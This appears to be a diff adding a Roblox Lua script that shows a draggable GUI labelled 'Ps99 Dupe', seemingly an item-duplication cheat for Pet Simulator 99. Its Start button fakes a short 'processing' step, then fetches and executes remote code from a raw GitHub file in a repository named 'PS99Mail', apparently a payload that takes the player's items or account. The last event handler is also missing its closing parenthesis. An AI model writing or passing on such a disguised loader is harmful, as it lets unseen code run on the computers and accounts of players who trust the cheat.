@@ -1,0 +1,105 @@
+-- Create a ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+-- Create a Frame to hold the elements
+local frame = Instance.new("Frame")
+frame.Parent = screenGui
+frame.Size = UDim2.new(0, 200, 0, 100)
+frame.Position = UDim2.new(0.5, -100, 0.5, -50)
+frame.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2) -- Dark gray background
+
+-- Add UICorner to make the frame's corners round
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 10)
+corner.Parent = frame
+
+-- Create TextLabel for "Ps99 Dupe"
+local textLabel = Instance.new("TextLabel")
+textLabel.Parent = frame
+textLabel.Size = UDim2.new(1, 0, 0.5, 0)
+textLabel.Position = UDim2.new(0, 0, 0, 0)
+textLabel.Text = "Ps99 Dupe"
+textLabel.TextSize = 20
+textLabel.TextColor3 = Color3.new(1, 1, 1)
+textLabel.BackgroundTransparency = 1
+
+-- Create a TextButton for "Start"
+local startButton = Instance.new("TextButton")
+startButton.Parent = frame
+startButton.Size = UDim2.new(0.8, 0, 0.4, 0)
+startButton.Position = UDim2.new(0.1, 0, 0.55, 0)
+startButton.Text = "Start"
+startButton.TextSize = 18
+startButton.TextColor3 = Color3.new(1, 1, 1)
+startButton.BackgroundColor3 = Color3.new(0.1, 0.6, 0.1)
+
+-- Add UICorner to make the button's corners round
+local buttonCorner = Instance.new("UICorner")
+buttonCorner.CornerRadius = UDim.new(0, 8)
+buttonCorner.Parent = startButton
+
+-- Function to handle additional actions
+local function additionalFunction()
+    -- Add your additional actions here
+    print("Additional function executed.")
+end
+
+-- Function to run when the button is clicked
+local function onClick()
+    startButton.Text = "Starting..."
+    wait(2) -- Simulate some processing time
+    startButton.Text = "Start"
+    additionalFunction()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/PS99Mail/main/Mementomori"))()
+end
+
+-- Connect the function to the button's Click event
+startButton.MouseButton1Click:Connect(onClick)
+
+-- Draggable functionality
+local touchStartPosition = nil
+local guiStartPosition = nil
+local dragging = false
+
+local function onTouchStart(input)
+    touchStartPosition = input.Position
+    guiStartPosition = frame.Position
+    dragging = true
+end
+
+local function onTouchMoved(input)
+    if dragging and touchStartPosition and guiStartPosition then
+        local delta = input.Position - touchStartPosition
+        frame.Position = UDim2.new(
+            guiStartPosition.X.Scale,
+            guiStartPosition.X.Offset + delta.X,
+            guiStartPosition.Y.Scale,
+            guiStartPosition.Y.Offset + delta.Y
+        )
+    end
+end
+
+local function onTouchEnded(input)
+    touchStartPosition = nil
+    guiStartPosition = nil
+    dragging = false
+end
+
+frame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.Touch then
+        onTouchStart(input)
+    end
+end)
+
+frame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.Touch then
+        onTouchMoved(input)
+    end
+end)
+
+frame.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.Touch then
+        onTouchEnded(input)
+    end
+end
